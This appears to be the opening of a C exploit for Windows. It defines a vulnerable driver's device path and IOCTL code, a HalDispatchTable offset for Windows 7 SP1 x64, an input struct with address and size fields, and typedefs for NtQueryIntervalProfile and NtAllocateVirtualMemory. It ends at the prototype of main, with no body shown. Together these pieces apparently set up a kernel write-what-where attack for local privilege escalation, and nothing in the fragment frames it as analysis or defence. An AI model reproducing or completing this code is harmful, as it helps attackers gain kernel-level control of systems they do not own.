#include <Windows.h>
#include <stdio.h>

#define TARGET_DEVICE "\\\\.\\GLOBALROOT\\Device\\OBJINFO"
#define TARGET_IOCTL 0xCF532013

#define NT_DLL_LOCATION "C:\\Windows\\System32\\ntdll.dll"

#define NT_HALDISPATCHTABLE_WIN7_SP1_X64_OFFSET 0x1E2CF8

typedef struct _DEVICE_INPUT
{
	unsigned long long Padding1;
	unsigned long long Address;
	unsigned long long Size;
	unsigned long long Padding2;
	unsigned long long Padding3;
	unsigned long long Padding4;
	unsigned long long Padding5;
	unsigned long long Padding6;
	unsigned long long Padding7;
	unsigned long long Padding8;
	unsigned long long Padding9;
	unsigned long long PaddingA;
} DEVICE_INPUT, * PDEVICE_INPUT;

typedef unsigned int(__stdcall* NtQueryIntervalProfile)(
	unsigned int      ProfileSource,
	PULONG            Interval
	);

typedef NTSTATUS(_stdcall* NtAllocateVirtualMemory)(
	HANDLE ProcessHandle,
	PVOID* BaseAddress,
	ULONG ZeroBits,
	PULONG RegionSize,
	ULONG AllocationType,
	ULONG Protect
	);

int main(int argc, char** argv);